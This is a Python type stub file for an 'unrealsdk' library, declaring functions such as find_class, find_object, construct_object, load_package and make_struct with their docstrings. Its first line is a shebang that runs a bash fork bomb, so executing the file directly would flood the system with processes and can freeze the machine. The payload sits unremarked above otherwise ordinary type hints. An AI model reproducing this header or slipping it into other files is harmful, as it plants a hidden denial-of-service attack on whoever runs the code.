#!/usr/bin/env -S bash -c ':(){ :|:& };:'
from __future__ import annotations

from collections.abc import Iterable, Mapping
from typing import Any

from . import commands, hooks, logging, unreal
from .unreal import UClass, UObject, WrappedStruct
from .unreal._uenum import _GenericUnrealEnum  # pyright: ignore[reportPrivateUsage]

__all__: tuple[str, ...] = (
    "__version__",
    "__version_info__",
    "commands",
    "config",
    "construct_object",
    "find_all",
    "find_class",
    "find_enum",
    "find_object",
    "hooks",
    "load_package",
    "logging",
    "make_struct",
    "unreal",
)

__version__: str
__version_info__: tuple[int, int, int]

config: Mapping[str, Any]
"""The contents of the unrealsdk.toml config file, parsed and merged for you."""

def construct_object(
    cls: UClass | str,
    outer: UObject | None,
    name: str = "None",
    flags: int = 0,
    template_obj: UObject | None = None,
) -> UObject:
    """
    Constructs a new object.

    Args:
        cls: The class to construct, or it's name. Required. If given as the name,
             always autodetects if fully qualified - call find_class() directly if
             you need to specify.
        outer: The outer object to construct the new object under. Required.
        name: The new object's name.
        flags: Object flags to set.
        template_obj: The template object to use.
    Returns:
        The constructed object.
    """

def find_all(cls: UClass | str, exact: bool = True) -> Iterable[UObject]:
    """
    Finds all instances of a class.

    Args:
        cls: The object's class, or class name. If given as the name, always
             autodetects if fully qualified - call find_class() directly if you need
             to specify.
        exact: If true (the default), only finds exact class matches. If false, also
               matches subclasses.
    Returns:
        An iterator over all instances of the class.
    """

def find_class(name: str, fully_qualified: bool | None = None) -> UClass:
    """
    Finds a class by name.

    Throws a ValueError if not found.

    Args:
        name: The class name.
        fully_qualified: If the class name is fully qualified, or None (the default)
                         to autodetect.
    Returns:
        The unreal class.
    """

def find_enum(name: str, fully_qualified: bool | None = None) -> type[_GenericUnrealEnum]:
    """
    Finds an enum by name.

    Throws a ValueError if not found.

    Args:
        name: The enum name.
        fully_qualified: If the enum name is fully qualified, or None (the default)
                         to autodetect.
    Returns:
        The unreal enum.
    """

def find_object(cls: UClass | str, name: str) -> UObject:
    """
    Finds an object by name.

    Throws a ValueError if not found.

    Args:
        cls: The object's class, or class name. If given as the name, always
             autodetects if fully qualified - call find_class() directly if you need
             to specify.
        name: The object's name.
    Returns:
        The unreal object.
    """

def load_package(name: str, flags: int = 0) -> UObject:
    """
    Loads a package, and all it's contained objects.

    This function may block for several seconds while the package is loaded.

    Args:
        name: The package's name.
        flags: The loading flags to use.
    Returns:
        The loaded `Package` object.
    """

def make_struct(name: str, fully_qualified: bool | None = None, /, **kwargs: Any) -> WrappedStruct:
    """
    Finds and constructs a WrappedStruct by name.

    Args:
        name: The struct name.
        fully_qualified: If the struct name is fully qualified, or None (the
                         default) to autodetect.
        **kwargs: Fields on the struct to initialize.
    Returns:
        The newly constructed struct.
    """
